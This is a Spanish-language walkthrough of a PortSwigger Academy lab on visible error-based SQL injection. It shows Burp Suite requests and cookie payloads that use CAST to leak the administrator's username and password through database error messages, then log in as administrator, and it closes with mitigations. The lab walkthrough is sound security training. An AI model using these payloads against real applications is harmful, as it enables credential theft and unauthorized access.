Lab13: Visible error-based SQL injection

Nivel Practitioner
Tipo de SQLi Visible error based SQL injection

Objetivo

Obtener la contraseña del usuario administrator de la tabla users utilizando una inyección basada en errores visibles.

Vulnerabilidad

Al introducir consultas SQL en la cookie TrackingId, se pueden obtener errores que ayudan a modificar la consulta para hacerla funcionar y poder obtener el usuario y la contraseña del administrador.

La aplicación muestra mensajes de error detallados que revelan información sobre la estructura de la base de datos y cómo modificar la consulta para que sea sintácticamente correcta, permitiendo al atacante ajustar su payload basándose en la retroalimentación del error.

Procedimiento

  1. Utilizar el interceptor de Burp Suite para capturar los paquetes enviados desde la página. 
    GET / HTTP/1.1
Cookie: TrackingId=xyz123
  2. Observar que la página tiene una cookie llamada TrackingId. Al ser una cookie personalizada, se puede utilizar SQL Injection para obtener información.
  3. Enviar la petición al Repeater y agregar una comilla después del valor de la cookie: 
    Cookie: TrackingId=xyz'
  4. Observar el error generado. La página muestra un error que revela la consulta SQL que se está ejecutando. El error indica que hay un carácter no esperado en la consulta.
  5. Introducir comentarios (dashes) para que no lea lo que está después de la comilla: 
    Cookie: TrackingId=xyz'--

    Con los dashes, el error desaparece, lo que confirma que la sintaxis ahora es correcta.

  6. Utilizar la función CAST para modificar el tipo de datos de la consulta a entero y generar errores controlados: 
    Cookie: TrackingId=xyz' AND CAST((SELECT 1) AS int)--

    Este payload genera un error que pide un carácter de tipo booleano.

  7. Modificar la consulta para incluir un 1 al inicio del CAST y hacerla booleana: 
    Cookie: TrackingId=xyz' AND 1=CAST((SELECT 1) AS int)--

    Esta consulta es sintácticamente correcta y no genera error.

  8. Modificar la consulta SELECT para pedir datos de la tabla de usuarios: 
    Cookie: TrackingId=xyz' AND 1=CAST((SELECT username FROM users) AS int)--

    Aparece un error que dice "UNTERMINATED STRING starting AT", indicando que el string terminó después de cierto carácter y tiene un límite.

  9. Ajustar la consulta para quedar dentro del límite y usar LIMIT: 
    Cookie: TrackingId=xyz' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
  10. Observar el error que muestra el primer usuario de la tabla, que normalmente es el usuario administrador. El error revela el nombre de usuario.
  11. Modificar la consulta para pedir la contraseña en vez del usuario: 
    Cookie: TrackingId=xyz' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

    El error generado muestra la contraseña del primer usuario (administrador).

  12. Introducir la contraseña obtenida en el formulario de login junto con el usuario "administrator" para resolver el laboratorio.

Payloads utilizados

Payload inicial (prueba de inyección)

xyz'--

Payload con CAST

xyz' AND 1=CAST((SELECT 1) AS int)--

Payload para obtener nombre de usuario

xyz' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

Payload para obtener contraseña

xyz' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

Explicación de los payloads

  • xyz': Cierra la cadena original de la cookie TrackingId.
  • AND: Permite agregar una condición adicional a la consulta.
  • 1=CAST((SELECT ...) AS int): Fuerza la conversión a entero del resultado de la subconsulta. Si el resultado no es un número entero válido, la base de datos genera un error que muestra el valor en el mensaje de error.
  • (SELECT username FROM users LIMIT 1): Obtiene el primer nombre de usuario de la tabla users.
  • (SELECT password FROM users LIMIT 1): Obtiene la primera contraseña de la tabla users.
  • LIMIT 1: Limita el resultado a una sola fila para evitar errores de subconsulta que devuelve múltiples filas.
  • --: Comenta el resto de la consulta original.

Proceso de extracción mediante errores

  • Paso 1: Probar comilla simple para generar error y confirmar inyección.
  • Paso 2: Usar comentarios para eliminar el error y validar la sintaxis.
  • Paso 3: Usar CAST para generar errores controlados que revelen información.
  • Paso 4: Ajustar la consulta según los mensajes de error hasta obtener los datos deseados.
  • Paso 5: El error muestra directamente el valor de la contraseña en el mensaje.

Ejemplo de mensaje de error con la contraseña:

ERROR: invalid input syntax for type integer: "8fg5h2j1k4m9p3q7r2s5"

Verificación del ataque

La vulnerabilidad se confirma cuando al enviar el payload con CAST, la página muestra un error que contiene el valor de la contraseña del administrador. Esto demuestra que:

  • La aplicación revela información sensible en mensajes de error.
  • Es posible extraer datos completos mediante errores visibles.
  • La técnica es más rápida que la inyección ciega booleana.

Una vez obtenida la contraseña (por ejemplo, "8fg5h2j1k4m9p3q7r2s5"), se introduce en el formulario de login junto con el usuario "administrator" y se accede al panel de administración, demostrando el éxito del ataque.

Resultado esperado: El laboratorio se resuelve correctamente al iniciar sesión como administrator y aparece el mensaje "Congratulations, you solved the lab!" en la interfaz de PortSwigger Academy.

Mitigación recomendada

Gestión Segura de Errores

La principal mitigación es configurar la aplicación para que no muestre errores detallados de base de datos al usuario. Los mensajes de error deben ser genéricos (ej. "Error interno del servidor") mientras que los detalles se registran en logs internos accesibles solo por administradores.

Consultas Preparadas (Parameterized Queries)

Implementar consultas parametrizadas para evitar que los datos del usuario se interpreten como código SQL.

SELECT * FROM tracking WHERE id = ?

Validación de Entradas

Validar estrictamente el formato del TrackingId. Si sigue un patrón predecible, rechazar cualquier valor que no cumpla con ese patrón.

Principio de Menor Privilegio

La cuenta de base de datos debe tener permisos mínimos, limitando el acceso a las tablas necesarias.

Deshabilitar Mensajes de Error Detallados en Producción

En entornos de producción, deshabilitar la visualización de errores detallados y mostrar páginas de error personalizadas.

Web Application Firewall (WAF)

Implementar un WAF que detecte y bloquee patrones de inyección SQL, incluyendo intentos de manipulación de cookies.
